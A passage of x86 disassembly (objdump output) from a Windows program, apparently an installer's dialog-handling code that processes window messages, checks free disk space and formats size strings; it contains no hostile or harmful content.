  4040d8:	33 c0                	xor    %eax,%eax
  4040da:	3b f3                	cmp    %ebx,%esi
  4040dc:	0f 94 c0             	sete   %al
  4040df:	6a 01                	push   $0x1
  4040e1:	05 0a 04 00 00       	add    $0x40a,%eax
  4040e6:	50                   	push   %eax
  4040e7:	ff 75 08             	push   0x8(%ebp)
  4040ea:	ff 15 ec 81 40 00    	call   *0x4081ec
  4040f0:	56                   	push   %esi
  4040f1:	e8 2e fc ff ff       	call   0x403d24
  4040f6:	68 e8 03 00 00       	push   $0x3e8
  4040fb:	ff 75 08             	push   0x8(%ebp)
  4040fe:	ff 15 64 82 40 00    	call   *0x408264
  404104:	8b f8                	mov    %eax,%edi
  404106:	57                   	push   %edi
  404107:	e8 2b fc ff ff       	call   0x403d37
  40410c:	8b 35 7c 82 40 00    	mov    0x40827c,%esi
  404112:	53                   	push   %ebx
  404113:	6a 01                	push   $0x1
  404115:	68 5b 04 00 00       	push   $0x45b
  40411a:	57                   	push   %edi
  40411b:	ff d6                	call   *%esi
  40411d:	a1 dc 45 47 00       	mov    0x4745dc,%eax
  404122:	8b 40 68             	mov    0x68(%eax),%eax
  404125:	3b c3                	cmp    %ebx,%eax
  404127:	7d 09                	jge    0x404132
  404129:	f7 d8                	neg    %eax
  40412b:	50                   	push   %eax
  40412c:	ff 15 50 82 40 00    	call   *0x408250
  404132:	50                   	push   %eax
  404133:	53                   	push   %ebx
  404134:	68 43 04 00 00       	push   $0x443
  404139:	57                   	push   %edi
  40413a:	ff d6                	call   *%esi
  40413c:	68 00 00 01 04       	push   $0x4010000
  404141:	53                   	push   %ebx
  404142:	68 45 04 00 00       	push   $0x445
  404147:	57                   	push   %edi
  404148:	ff d6                	call   *%esi
  40414a:	ff 75 14             	push   0x14(%ebp)
  40414d:	89 1d 18 a2 43 00    	mov    %ebx,0x43a218
  404153:	e8 8d 1e 00 00       	call   0x405fe5
  404158:	50                   	push   %eax
  404159:	53                   	push   %ebx
  40415a:	68 35 04 00 00       	push   $0x435
  40415f:	57                   	push   %edi
  404160:	ff d6                	call   *%esi
  404162:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404165:	50                   	push   %eax
  404166:	ff 75 0c             	push   0xc(%ebp)
  404169:	68 49 04 00 00       	push   $0x449
  40416e:	57                   	push   %edi
  40416f:	ff d6                	call   *%esi
  404171:	89 1d 8c a2 45 00    	mov    %ebx,0x45a28c
  404177:	33 c0                	xor    %eax,%eax
  404179:	e9 5b 01 00 00       	jmp    0x4042d9
  40417e:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  404185:	8b 35 7c 82 40 00    	mov    0x40827c,%esi
  40418b:	75 5c                	jne    0x4041e9
  40418d:	8b 45 10             	mov    0x10(%ebp),%eax
  404190:	c1 e8 10             	shr    $0x10,%eax
  404193:	66 85 c0             	test   %ax,%ax
  404196:	0f 85 2e 01 00 00    	jne    0x4042ca
  40419c:	39 1d 8c a2 45 00    	cmp    %ebx,0x45a28c
  4041a2:	0f 85 22 01 00 00    	jne    0x4042ca
  4041a8:	8b 3d 80 a2 45 00    	mov    0x45a280,%edi
  4041ae:	83 c7 14             	add    $0x14,%edi
  4041b1:	f6 07 20             	testb  $0x20,(%edi)
  4041b4:	0f 84 10 01 00 00    	je     0x4042ca
  4041ba:	53                   	push   %ebx
  4041bb:	53                   	push   %ebx
  4041bc:	68 f0 00 00 00       	push   $0xf0
  4041c1:	68 0a 04 00 00       	push   $0x40a
  4041c6:	ff 75 08             	push   0x8(%ebp)
  4041c9:	ff 15 64 82 40 00    	call   *0x408264
  4041cf:	50                   	push   %eax
  4041d0:	ff d6                	call   *%esi
  4041d2:	8b 0f                	mov    (%edi),%ecx
  4041d4:	83 e0 01             	and    $0x1,%eax
  4041d7:	83 e1 fe             	and    $0xfffffffe,%ecx
  4041da:	0b c8                	or     %eax,%ecx
  4041dc:	50                   	push   %eax
  4041dd:	89 0f                	mov    %ecx,(%edi)
  4041df:	e8 40 fb ff ff       	call   0x403d24
  4041e4:	e8 17 fb ff ff       	call   0x403d00
  4041e9:	83 7d 0c 4e          	cmpl   $0x4e,0xc(%ebp)
  4041ed:	0f 85 c8 00 00 00    	jne    0x4042bb
  4041f3:	68 e8 03 00 00       	push   $0x3e8
  4041f8:	ff 75 08             	push   0x8(%ebp)
  4041fb:	ff 15 64 82 40 00    	call   *0x408264
  404201:	8b 7d 14             	mov    0x14(%ebp),%edi
  404204:	81 7f 08 0b 07 00 00 	cmpl   $0x70b,0x8(%edi)
  40420b:	75 6f                	jne    0x40427c
  40420d:	81 7f 0c 01 02 00 00 	cmpl   $0x201,0xc(%edi)
  404214:	75 66                	jne    0x40427c
  404216:	8b 4f 1c             	mov    0x1c(%edi),%ecx
  404219:	8b 57 18             	mov    0x18(%edi),%edx
  40421c:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  40421f:	2b ca                	sub    %edx,%ecx
  404221:	89 55 e8             	mov    %edx,-0x18(%ebp)
  404224:	c7 45 f0 40 45 46 00 	movl   $0x464540,-0x10(%ebp)
  40422b:	81 f9 10 80 00 00    	cmp    $0x8010,%ecx
  404231:	73 49                	jae    0x40427c
  404233:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  404236:	51                   	push   %ecx
  404237:	53                   	push   %ebx
  404238:	68 4b 04 00 00       	push   $0x44b
  40423d:	50                   	push   %eax
  40423e:	ff d6                	call   *%esi
  404240:	8b 3d 44 82 40 00    	mov    0x408244,%edi
  404246:	68 02 7f 00 00       	push   $0x7f02
  40424b:	53                   	push   %ebx
  40424c:	ff d7                	call   *%edi
  40424e:	50                   	push   %eax
  40424f:	ff 15 48 82 40 00    	call   *0x408248
  404255:	6a 01                	push   $0x1
  404257:	53                   	push   %ebx
  404258:	53                   	push   %ebx
  404259:	ff 75 f0             	push   -0x10(%ebp)
  40425c:	68 7c 86 40 00       	push   $0x40867c
  404261:	ff 75 08             	push   0x8(%ebp)
  404264:	ff 15 88 81 40 00    	call   *0x408188
  40426a:	68 00 7f 00 00       	push   $0x7f00
  40426f:	53                   	push   %ebx
  404270:	ff d7                	call   *%edi
  404272:	50                   	push   %eax
  404273:	ff 15 48 82 40 00    	call   *0x408248
  404279:	8b 7d 14             	mov    0x14(%ebp),%edi
  40427c:	81 7f 08 00 07 00 00 	cmpl   $0x700,0x8(%edi)
  404283:	75 48                	jne    0x4042cd
  404285:	81 7f 0c 00 01 00 00 	cmpl   $0x100,0xc(%edi)
  40428c:	75 3f                	jne    0x4042cd
  40428e:	83 7f 10 0d          	cmpl   $0xd,0x10(%edi)
  404292:	75 10                	jne    0x4042a4
  404294:	53                   	push   %ebx
  404295:	6a 01                	push   $0x1
  404297:	68 11 01 00 00       	push   $0x111
  40429c:	ff 35 d4 45 47 00    	push   0x4745d4
  4042a2:	ff d6                	call   *%esi
  4042a4:	83 7f 10 1b          	cmpl   $0x1b,0x10(%edi)
  4042a8:	75 0c                	jne    0x4042b6
  4042aa:	53                   	push   %ebx
  4042ab:	53                   	push   %ebx
  4042ac:	6a 10                	push   $0x10
  4042ae:	ff 35 d4 45 47 00    	push   0x4745d4
  4042b4:	ff d6                	call   *%esi
  4042b6:	33 c0                	xor    %eax,%eax
  4042b8:	40                   	inc    %eax
  4042b9:	eb 1e                	jmp    0x4042d9
  4042bb:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  4042c2:	75 06                	jne    0x4042ca
  4042c4:	ff 05 8c a2 45 00    	incl   0x45a28c
  4042ca:	8b 7d 14             	mov    0x14(%ebp),%edi
  4042cd:	8b 45 0c             	mov    0xc(%ebp),%eax
  4042d0:	57                   	push   %edi
  4042d1:	ff 75 10             	push   0x10(%ebp)
  4042d4:	e8 90 fa ff ff       	call   0x403d69
  4042d9:	5f                   	pop    %edi
  4042da:	5e                   	pop    %esi
  4042db:	5b                   	pop    %ebx
  4042dc:	c9                   	leave
  4042dd:	c2 10 00             	ret    $0x10
  4042e0:	55                   	push   %ebp
  4042e1:	8b ec                	mov    %esp,%ebp
  4042e3:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  4042ea:	56                   	push   %esi
  4042eb:	8b 75 14             	mov    0x14(%ebp),%esi
  4042ee:	75 29                	jne    0x404319
  4042f0:	ff 76 30             	push   0x30(%esi)
  4042f3:	6a 1d                	push   $0x1d
  4042f5:	ff 75 08             	push   0x8(%ebp)
  4042f8:	e8 e1 f9 ff ff       	call   0x403cde
  4042fd:	8b 46 3c             	mov    0x3c(%esi),%eax
  404300:	69 c0 08 40 00 00    	imul   $0x4008,%eax,%eax
  404306:	05 00 50 47 00       	add    $0x475000,%eax
  40430b:	50                   	push   %eax
  40430c:	68 e8 03 00 00       	push   $0x3e8
  404311:	ff 75 08             	push   0x8(%ebp)
  404314:	e8 cb 18 00 00       	call   0x405be4
  404319:	8b 45 0c             	mov    0xc(%ebp),%eax
  40431c:	56                   	push   %esi
  40431d:	ff 75 10             	push   0x10(%ebp)
  404320:	e8 44 fa ff ff       	call   0x403d69
  404325:	5e                   	pop    %esi
  404326:	5d                   	pop    %ebp
  404327:	c2 10 00             	ret    $0x10
  40432a:	55                   	push   %ebp
  40432b:	8b ec                	mov    %esp,%ebp
  40432d:	81 ec 84 00 00 00    	sub    $0x84,%esp
  404333:	53                   	push   %ebx
  404334:	56                   	push   %esi
  404335:	57                   	push   %edi
  404336:	8b f8                	mov    %eax,%edi
  404338:	6a 14                	push   $0x14
  40433a:	5b                   	pop    %ebx
  40433b:	c7 45 fc dc ff ff ff 	movl   $0xffffffdc,-0x4(%ebp)
  404342:	81 ff 00 00 10 00    	cmp    $0x100000,%edi
  404348:	73 0a                	jae    0x404354
  40434a:	6a 0a                	push   $0xa
  40434c:	5b                   	pop    %ebx
  40434d:	c7 45 fc dd ff ff ff 	movl   $0xffffffdd,-0x4(%ebp)
  404354:	81 ff 00 04 00 00    	cmp    $0x400,%edi
  40435a:	73 09                	jae    0x404365
  40435c:	33 db                	xor    %ebx,%ebx
  40435e:	c7 45 fc de ff ff ff 	movl   $0xffffffde,-0x4(%ebp)
  404365:	81 ff 33 33 ff ff    	cmp    $0xffff3333,%edi
  40436b:	73 0f                	jae    0x40437c
  40436d:	33 c0                	xor    %eax,%eax
  40436f:	40                   	inc    %eax
  404370:	8b cb                	mov    %ebx,%ecx
  404372:	d3 e0                	shl    %cl,%eax
  404374:	6a 14                	push   $0x14
  404376:	59                   	pop    %ecx
  404377:	99                   	cltd
  404378:	f7 f9                	idiv   %ecx
  40437a:	03 f8                	add    %eax,%edi
  40437c:	ff 75 0c             	push   0xc(%ebp)
  40437f:	be 60 a2 44 00       	mov    $0x44a260,%esi
  404384:	56                   	push   %esi
  404385:	e8 c6 22 00 00       	call   0x406650
  40438a:	6a df                	push   $0xffffffdf
  40438c:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40438f:	50                   	push   %eax
  404390:	e8 bb 22 00 00       	call   0x406650
  404395:	50                   	push   %eax
  404396:	ff 75 fc             	push   -0x4(%ebp)
  404399:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
  40439f:	50                   	push   %eax
  4043a0:	e8 ab 22 00 00       	call   0x406650
  4043a5:	50                   	push   %eax
  4043a6:	8b c7                	mov    %edi,%eax
  4043a8:	25 ff ff ff 00       	and    $0xffffff,%eax
  4043ad:	6b c0 0a             	imul   $0xa,%eax,%eax
  4043b0:	6a 0a                	push   $0xa
  4043b2:	8b cb                	mov    %ebx,%ecx
  4043b4:	d3 e8                	shr    %cl,%eax
  4043b6:	59                   	pop    %ecx
  4043b7:	33 d2                	xor    %edx,%edx
  4043b9:	f7 f1                	div    %ecx
  4043bb:	8b cb                	mov    %ebx,%ecx
  4043bd:	d3 ef                	shr    %cl,%edi
  4043bf:	52                   	push   %edx
  4043c0:	57                   	push   %edi
  4043c1:	68 88 86 40 00       	push   $0x408688
  4043c6:	56                   	push   %esi
  4043c7:	e8 19 1c 00 00       	call   0x405fe5
  4043cc:	8d 04 45 60 a2 44 00 	lea    0x44a260(,%eax,2),%eax
  4043d3:	50                   	push   %eax
  4043d4:	ff 15 3c 82 40 00    	call   *0x40823c
  4043da:	83 c4 18             	add    $0x18,%esp
  4043dd:	56                   	push   %esi
  4043de:	ff 75 08             	push   0x8(%ebp)
  4043e1:	ff 35 88 c5 46 00    	push   0x46c588
  4043e7:	e8 f8 17 00 00       	call   0x405be4
  4043ec:	5f                   	pop    %edi
  4043ed:	5e                   	pop    %esi
  4043ee:	5b                   	pop    %ebx
  4043ef:	c9                   	leave
  4043f0:	c2 08 00             	ret    $0x8
  4043f3:	8b 15 ec 45 47 00    	mov    0x4745ec,%edx
  4043f9:	8b 0d e8 45 47 00    	mov    0x4745e8,%ecx
  4043ff:	33 c0                	xor    %eax,%eax
  404401:	85 d2                	test   %edx,%edx
  404403:	74 1a                	je     0x40441f
  404405:	56                   	push   %esi
  404406:	4a                   	dec    %edx
  404407:	f6 41 08 01          	testb  $0x1,0x8(%ecx)
  40440b:	74 07                	je     0x404414
  40440d:	8b 74 24 08          	mov    0x8(%esp),%esi
  404411:	03 04 b1             	add    (%ecx,%esi,4),%eax
  404414:	81 c1 20 40 00 00    	add    $0x4020,%ecx
  40441a:	85 d2                	test   %edx,%edx
  40441c:	75 e8                	jne    0x404406
  40441e:	5e                   	pop    %esi
  40441f:	c2 04 00             	ret    $0x4
  404422:	55                   	push   %ebp
  404423:	8b ec                	mov    %esp,%ebp
  404425:	83 ec 48             	sub    $0x48,%esp
  404428:	a1 80 a2 45 00       	mov    0x45a280,%eax
  40442d:	53                   	push   %ebx
  40442e:	56                   	push   %esi
  40442f:	8b 70 3c             	mov    0x3c(%eax),%esi
  404432:	69 f6 08 40 00 00    	imul   $0x4008,%esi,%esi
  404438:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40443b:	8b 40 38             	mov    0x38(%eax),%eax
  40443e:	81 c6 00 50 47 00    	add    $0x475000,%esi
  404444:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  40444b:	57                   	push   %edi
  40444c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40444f:	bb fb 03 00 00       	mov    $0x3fb,%ebx
  404454:	75 0d                	jne    0x404463
  404456:	56                   	push   %esi
  404457:	53                   	push   %ebx
  404458:	e8 8d 17 00 00       	call   0x405bea
  40445d:	56                   	push   %esi
  40445e:	e8 0a 1c 00 00       	call   0x40606d
  404463:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  40446a:	75 72                	jne    0x4044de
  40446c:	8b 7d 08             	mov    0x8(%ebp),%edi
  40446f:	53                   	push   %ebx
  404470:	57                   	push   %edi
  404471:	ff 15 64 82 40 00    	call   *0x408264
  404477:	56                   	push   %esi
  404478:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40447b:	e8 0b 18 00 00       	call   0x405c8b
  404480:	85 c0                	test   %eax,%eax
  404482:	74 10                	je     0x404494
  404484:	56                   	push   %esi
  404485:	e8 36 18 00 00       	call   0x405cc0
  40448a:	85 c0                	test   %eax,%eax
  40448c:	75 06                	jne    0x404494
  40448e:	56                   	push   %esi
  40448f:	e8 d8 20 00 00       	call   0x40656c
  404494:	56                   	push   %esi
  404495:	ff 75 f8             	push   -0x8(%ebp)
  404498:	89 3d 88 c5 46 00    	mov    %edi,0x46c588
  40449e:	ff 15 2c 82 40 00    	call   *0x40822c
  4044a4:	8b 45 14             	mov    0x14(%ebp),%eax
  4044a7:	ff 70 34             	push   0x34(%eax)
  4044aa:	6a 01                	push   $0x1
  4044ac:	57                   	push   %edi
  4044ad:	e8 2c f8 ff ff       	call   0x403cde
  4044b2:	8b 45 14             	mov    0x14(%ebp),%eax
  4044b5:	ff 70 30             	push   0x30(%eax)
  4044b8:	6a 14                	push   $0x14
  4044ba:	57                   	push   %edi
  4044bb:	e8 1e f8 ff ff       	call   0x403cde
  4044c0:	ff 75 f8             	push   -0x8(%ebp)
  4044c3:	e8 6f f8 ff ff       	call   0x403d37
  4044c8:	6a 07                	push   $0x7
  4044ca:	e8 76 1c 00 00       	call   0x406145
  4044cf:	85 c0                	test   %eax,%eax
  4044d1:	0f 84 82 02 00 00    	je     0x404759
  4044d7:	6a 01                	push   $0x1
  4044d9:	ff 75 f8             	push   -0x8(%ebp)
  4044dc:	ff d0                	call   *%eax
  4044de:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  4044e5:	0f 85 d2 00 00 00    	jne    0x4045bd
  4044eb:	0f b7 45 10          	movzwl 0x10(%ebp),%eax
  4044ef:	3b c3                	cmp    %ebx,%eax
  4044f1:	75 1b                	jne    0x40450e
  4044f3:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4044f6:	c1 e9 10             	shr    $0x10,%ecx
  4044f9:	ba 00 03 00 00       	mov    $0x300,%edx
  4044fe:	66 3b ca             	cmp    %dx,%cx
  404501:	0f 85 52 02 00 00    	jne    0x404759
  404507:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  40450e:	3d e9 03 00 00       	cmp    $0x3e9,%eax
  404513:	0f 85 a4 00 00 00    	jne    0x4045bd
  404519:	6a 07                	push   $0x7
  40451b:	59                   	pop    %ecx
  40451c:	ff 75 fc             	push   -0x4(%ebp)
  40451f:	33 c0                	xor    %eax,%eax
  404521:	8d 7d bc             	lea    -0x44(%ebp),%edi
  404524:	f3 ab                	rep stos %eax,%es:(%edi)
  404526:	8b 45 08             	mov    0x8(%ebp),%eax
  404529:	bf 60 a2 44 00       	mov    $0x44a260,%edi
  40452e:	68 28 a2 43 00       	push   $0x43a228
  404533:	89 45 b8             	mov    %eax,-0x48(%ebp)
  404536:	89 7d c0             	mov    %edi,-0x40(%ebp)
  404539:	c7 45 cc e2 3e 40 00 	movl   $0x403ee2,-0x34(%ebp)
  404540:	89 75 d0             	mov    %esi,-0x30(%ebp)
  404543:	e8 08 21 00 00       	call   0x406650
  404548:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  40454b:	8d 45 b8             	lea    -0x48(%ebp),%eax
  40454e:	50                   	push   %eax
  40454f:	c7 45 c8 41 00 00 00 	movl   $0x41,-0x38(%ebp)
  404556:	ff 15 7c 81 40 00    	call   *0x40817c
  40455c:	85 c0                	test   %eax,%eax
  40455e:	74 56                	je     0x4045b6
  404560:	50                   	push   %eax
  404561:	ff 15 b0 82 40 00    	call   *0x4082b0
  404567:	56                   	push   %esi
  404568:	e8 ff 1f 00 00       	call   0x40656c
  40456d:	a1 dc 45 47 00       	mov    0x4745dc,%eax
  404572:	8b 80 1c 01 00 00    	mov    0x11c(%eax),%eax
  404578:	85 c0                	test   %eax,%eax
  40457a:	74 28                	je     0x4045a4
  40457c:	81 fe a8 90 4c 00    	cmp    $0x4c90a8,%esi
  404582:	75 20                	jne    0x4045a4
  404584:	50                   	push   %eax
  404585:	6a 00                	push   $0x0
  404587:	e8 c4 20 00 00       	call   0x406650
  40458c:	57                   	push   %edi
  40458d:	bf 40 45 46 00       	mov    $0x464540,%edi
  404592:	57                   	push   %edi
  404593:	ff 15 18 81 40 00    	call   *0x408118
  404599:	85 c0                	test   %eax,%eax
  40459b:	74 07                	je     0x4045a4
  40459d:	57                   	push   %edi
  40459e:	56                   	push   %esi
  40459f:	e8 b6 1a 00 00       	call   0x40605a
  4045a4:	ff 05 24 a2 43 00    	incl   0x43a224
  4045aa:	56                   	push   %esi
  4045ab:	53                   	push   %ebx
  4045ac:	ff 75 08             	push   0x8(%ebp)
  4045af:	e8 30 16 00 00       	call   0x405be4
  4045b4:	eb 07                	jmp    0x4045bd
  4045b6:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  4045bd:	81 7d 0c 0f 04 00 00 	cmpl   $0x40f,0xc(%ebp)
  4045c4:	74 0d                	je     0x4045d3
  4045c6:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  4045cd:	0f 85 86 01 00 00    	jne    0x404759
  4045d3:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4045d7:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  4045db:	56                   	push   %esi
  4045dc:	53                   	push   %ebx
  4045dd:	e8 08 16 00 00       	call   0x405bea
  4045e2:	56                   	push   %esi
  4045e3:	e8 e0 1f 00 00       	call   0x4065c8
  4045e8:	85 c0                	test   %eax,%eax
  4045ea:	75 07                	jne    0x4045f3
  4045ec:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4045f3:	56                   	push   %esi
  4045f4:	bf 48 e2 43 00       	mov    $0x43e248,%edi
  4045f9:	57                   	push   %edi
  4045fa:	e8 d0 19 00 00       	call   0x405fcf
  4045ff:	33 db                	xor    %ebx,%ebx
  404601:	53                   	push   %ebx
  404602:	e8 3e 1b 00 00       	call   0x406145
  404607:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40460a:	3b c3                	cmp    %ebx,%eax
  40460c:	74 3c                	je     0x40464a
  40460e:	33 c0                	xor    %eax,%eax
  404610:	3b c7                	cmp    %edi,%eax
  404612:	74 34                	je     0x404648
  404614:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  404617:	50                   	push   %eax
  404618:	8d 45 d8             	lea    -0x28(%ebp),%eax
  40461b:	50                   	push   %eax
  40461c:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40461f:	50                   	push   %eax
  404620:	57                   	push   %edi
  404621:	ff 55 f4             	call   *-0xc(%ebp)
  404624:	85 c0                	test   %eax,%eax
  404626:	75 75                	jne    0x40469d
  404628:	85 db                	test   %ebx,%ebx
  40462a:	74 03                	je     0x40462f
  40462c:	66 89 03             	mov    %ax,(%ebx)
  40462f:	57                   	push   %edi
  404630:	e8 66 1f 00 00       	call   0x40659b
  404635:	8b d8                	mov    %eax,%ebx
  404637:	33 c0                	xor    %eax,%eax
  404639:	66 89 03             	mov    %ax,(%ebx)
  40463c:	4b                   	dec    %ebx
  40463d:	4b                   	dec    %ebx
  40463e:	6a 5c                	push   $0x5c
  404640:	58                   	pop    %eax
  404641:	66 89 03             	mov    %ax,(%ebx)
  404644:	3b df                	cmp    %edi,%ebx
  404646:	75 cc                	jne    0x404614
  404648:	33 db                	xor    %ebx,%ebx
  40464a:	56                   	push   %esi
  40464b:	57                   	push   %edi
  40464c:	e8 7e 19 00 00       	call   0x405fcf
  404651:	57                   	push   %edi
  404652:	e8 69 16 00 00       	call   0x405cc0
  404657:	3b c3                	cmp    %ebx,%eax
  404659:	74 05                	je     0x404660
  40465b:	33 c9                	xor    %ecx,%ecx
  40465d:	66 89 08             	mov    %cx,(%eax)
  404660:	8d 45 dc             	lea    -0x24(%ebp),%eax
  404663:	50                   	push   %eax
  404664:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404667:	50                   	push   %eax
  404668:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40466b:	50                   	push   %eax
  40466c:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40466f:	50                   	push   %eax
  404670:	57                   	push   %edi
  404671:	ff 15 d0 80 40 00    	call   *0x4080d0
  404677:	85 c0                	test   %eax,%eax
  404679:	74 42                	je     0x4046bd
  40467b:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40467e:	0f af 45 e8          	imul   -0x18(%ebp),%eax
  404682:	be 00 04 00 00       	mov    $0x400,%esi
  404687:	56                   	push   %esi
  404688:	ff 75 f4             	push   -0xc(%ebp)
  40468b:	50                   	push   %eax
  40468c:	ff 15 4c 81 40 00    	call   *0x40814c
  404692:	8b f8                	mov    %eax,%edi
  404694:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  40469b:	eb 28                	jmp    0x4046c5
  40469d:	b9 0a 00 00 00       	mov    $0xa,%ecx
  4046a2:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4046a5:	8b 55 f0             	mov    -0x10(%ebp),%edx
  4046a8:	0f ad d0             	shrd   %cl,%edx,%eax
  4046ab:	d3 ea                	shr    %cl,%edx
  4046ad:	89 55 dc             	mov    %edx,-0x24(%ebp)
  4046b0:	8b f8                	mov    %eax,%edi
  4046b2:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  4046b9:	33 db                	xor    %ebx,%ebx
  4046bb:	eb 03                	jmp    0x4046c0
  4046bd:	8b 7d 0c             	mov    0xc(%ebp),%edi
  4046c0:	be 00 04 00 00       	mov    $0x400,%esi
  4046c5:	6a 05                	push   $0x5
  4046c7:	e8 27 fd ff ff       	call   0x4043f3
  4046cc:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  4046cf:	74 0b                	je     0x4046dc
  4046d1:	3b f8                	cmp    %eax,%edi
  4046d3:	73 07                	jae    0x4046dc
  4046d5:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  4046dc:	8b 0d a8 c5 46 00    	mov    0x46c5a8,%ecx
  4046e2:	39 59 10             	cmp    %ebx,0x10(%ecx)
  4046e5:	74 2b                	je     0x404712
  4046e7:	6a fb                	push   $0xfffffffb
  4046e9:	68 ff 03 00 00       	push   $0x3ff
  4046ee:	e8 37 fc ff ff       	call   0x40432a
  4046f3:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  4046f6:	74 0c                	je     0x404704
  4046f8:	6a fc                	push   $0xfffffffc
  4046fa:	56                   	push   %esi
  4046fb:	8b c7                	mov    %edi,%eax
  4046fd:	e8 28 fc ff ff       	call   0x40432a
  404702:	eb 0e                	jmp    0x404712
  404704:	68 78 86 40 00       	push   $0x408678
  404709:	56                   	push   %esi
  40470a:	ff 75 08             	push   0x8(%ebp)
  40470d:	e8 d2 14 00 00       	call   0x405be4
  404712:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404715:	a3 a4 46 47 00       	mov    %eax,0x4746a4
  40471a:	3b c3                	cmp    %ebx,%eax
  40471c:	75 0a                	jne    0x404728
  40471e:	6a 07                	push   $0x7
  404720:	e8 b8 cd ff ff       	call   0x4014dd
  404725:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404728:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40472b:	85 70 14             	test   %esi,0x14(%eax)
  40472e:	74 03                	je     0x404733
  404730:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  404733:	33 c0                	xor    %eax,%eax
  404735:	39 5d fc             	cmp    %ebx,-0x4(%ebp)
  404738:	0f 94 c0             	sete   %al
  40473b:	50                   	push   %eax
  40473c:	e8 e3 f5 ff ff       	call   0x403d24
  404741:	39 5d fc             	cmp    %ebx,-0x4(%ebp)
  404744:	75 0d                	jne    0x404753
  404746:	39 1d 24 a2 43 00    	cmp    %ebx,0x43a224
  40474c:	75 05                	jne    0x404753
  40474e:	e8 ad f5 ff ff       	call   0x403d00
  404753:	89 1d 24 a2 43 00    	mov    %ebx,0x43a224
  404759:	ff 75 14             	push   0x14(%ebp)
  40475c:	8b 45 0c             	mov    0xc(%ebp),%eax
  40475f:	ff 75 10             	push   0x10(%ebp)
  404762:	e8 02 f6 ff ff       	call   0x403d69
  404767:	5f                   	pop    %edi
  404768:	5e                   	pop    %esi
  404769:	5b                   	pop    %ebx
  40476a:	c9                   	leave
  40476b:	c2 10 00             	ret    $0x10
  40476e:	55                   	push   %ebp
  40476f:	8b ec                	mov    %esp,%ebp
  404771:	83 ec 38             	sub    $0x38,%esp
  404774:	56                   	push   %esi
  404775:	8b 35 7c 82 40 00    	mov    0x40827c,%esi
  40477b:	57                   	push   %edi
  40477c:	8b 7d 08             	mov    0x8(%ebp),%edi
  40477f:	6a 00                	push   $0x0
  404781:	6a 09                	push   $0x9
  404783:	68 0a 11 00 00       	push   $0x110a
  404788:	57                   	push   %edi
  404789:	ff d6                	call   *%esi
  40478b:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  40478f:	74 3a                	je     0x4047cb
  404791:	ff 15 9c 81 40 00    	call   *0x40819c
  404797:	0f bf c8             	movswl %ax,%ecx
  40479a:	c1 e8 10             	shr    $0x10,%eax
  40479d:	98                   	cwtl
  40479e:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4047a1:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4047a4:	50                   	push   %eax
  4047a5:	57                   	push   %edi
  4047a6:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4047a9:	ff 15 98 81 40 00    	call   *0x408198
  4047af:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4047b2:	50                   	push   %eax
  4047b3:	6a 00                	push   $0x0
  4047b5:	68 11 11 00 00       	push   $0x1111
  4047ba:	57                   	push   %edi
  4047bb:	ff d6                	call   *%esi
  4047bd:	f6 45 f8 66          	testb  $0x66,-0x8(%ebp)
  4047c1:	75 05                	jne    0x4047c8
  4047c3:	83 c8 ff             	or     $0xffffffff,%eax
  4047c6:	eb 1e                	jmp    0x4047e6
  4047c8:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4047cb:	89 45 cc             	mov    %eax,-0x34(%ebp)
  4047ce:	8d 45 c8             	lea    -0x38(%ebp),%eax
  4047d1:	50                   	push   %eax
  4047d2:	6a 00                	push   $0x0
  4047d4:	68 3e 11 00 00       	push   $0x113e
  4047d9:	57                   	push   %edi
  4047da:	c7 45 c8 04 00 00 00 	movl   $0x4,-0x38(%ebp)
  4047e1:	ff d6                	call   *%esi
  4047e3:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4047e6:	5f                   	pop    %edi
  4047e7:	5e                   	pop    %esi
  4047e8:	c9                   	leave
  4047e9:	c2 08 00             	ret    $0x8
  4047ec:	55                   	push   %ebp
  4047ed:	8b ec                	mov    %esp,%ebp
  4047ef:	81 7d 0c 02 01 00 00 	cmpl   $0x102,0xc(%ebp)
